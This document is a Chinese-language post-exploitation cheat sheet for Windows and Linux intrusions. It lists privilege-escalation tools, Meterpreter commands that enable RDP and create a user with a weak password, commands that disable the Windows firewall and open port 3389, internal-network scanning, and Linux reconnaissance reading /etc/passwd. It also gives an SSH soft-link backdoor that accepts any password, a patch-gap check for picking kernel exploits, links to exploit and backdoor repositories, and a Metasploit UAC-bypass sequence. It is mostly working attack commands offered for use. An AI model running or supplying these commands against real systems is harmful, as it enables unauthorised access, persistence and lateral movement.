#  信息收集
## windows

```shell
## 提权
JuicyPotato
SweetPotato
echo 其他漏洞见 z02
## 横向
meter> upload /root/fscan64.exe # 1.ipconfig 查看网段, # 2.arp -a # 2.1 route print # 3. fscan扫描 横向移动
meterpreter > run post/windows/manage/enable_rdp # 开 rdp
meterpreter > run getgui -e                      # 开启远程桌面
meterpreter > run getgui -u xiaowei -p 123456    # 创建用户
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1                              # 开启3389远程桌面
netsh advfirewall set allprofiles state off 
netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes                                 # M2: 放行3389
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow # M1: 放行3389

# 远程桌面
proxychains rdesktop 192.168.52.141
rdesktop -u yourname -p password -g 1024x720 192.168.0.2
remmina # 可配代理 见 90_tools.md

net config Workstation # (当前计算机名，全名，用户名，系统版本，工作站域，登陆域)
net localgroup administrators
net view # 查看局域网内所有计算机
使用CS扩展的Ladon插件探测内网存活主机情况
Ladon 192.168.52.0/24 OnlinePC
net view /domain 查看域情况
CS和msf联动
```


## linux 
[Linux内网渗透基础篇](https://mp.weixin.qq.com/s/MV4bTIW7YKiBgS6r03_FFw)
```shell
get_info_01_linux.sh
meterpreter > getSystem "whoami"

uname -a    # 获取所有版本信息
uname -m    # 获取Linux内核架构
cat /proc/version    # 获取内核信息 
cat /etc/*-release   # 发布信息
cat /etc/issue    # 发布信息
hostname    # 获取主机名
cat /etc/passwd    # 列出系统所有用户 
cat /etc/group    # 列出系统所有组 
w    # 查看目前登录的用户
whoami    # 查看当前用户 
id    # 查看当前用户信息 
sudo -l    # 列出目前用户可执行与无法执行的指令 
ps aux    # 查看进程信息 
ls -la /etc/cron*    # 查看计划任务
ls -la /tmp
ifconfig -a    # 列出网络接口信息 
cat /etc/network/interfaces    # 列出网络接口信息 
arp -a    # 查看系统arp表 
route    # 打印路由信息
netstat -anplt    # 打印本地端口开放信息 
iptables -L    # 列出iptable的配置规则
```

wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:“KBxxxxxx”
### 权限维持

ssh软连接后门 需root执行后门命令，任意密码登录
```shell
ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oport=12345
```

# 04自动信息收集
Host Information Gathering Script：HIGS.bat
https://github.com/myh0st/scripts/blob/master/Windows%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/HIGS.bat
privilege-escalation-awesome-scripts：winPEAS.bat
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat

# 提权工具脚本

https://blog.csdn.net/weixin_43873557/article/details/113760973

快速查找exp

systeminfo>micropoor.txt&(for %i in (   KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find /i "%i"|| @echo %i you can fuck)&del /f /q /a  micropoor.txt

https://github.com/SecWiki/windows-kernel-exploits
https://github.com/WindowsExploits/Exploits

## ssh 相关
1.密钥篡改 authorized_keys 
2.重装覆盖 openssh-backdoor https://github.com/Psmths/openssh-backdoor

### bypassuac

```bash
search bypassuac
use exploit/windows/local/bypassuac
options
set session 1
run -j
getuid
getsystem
```
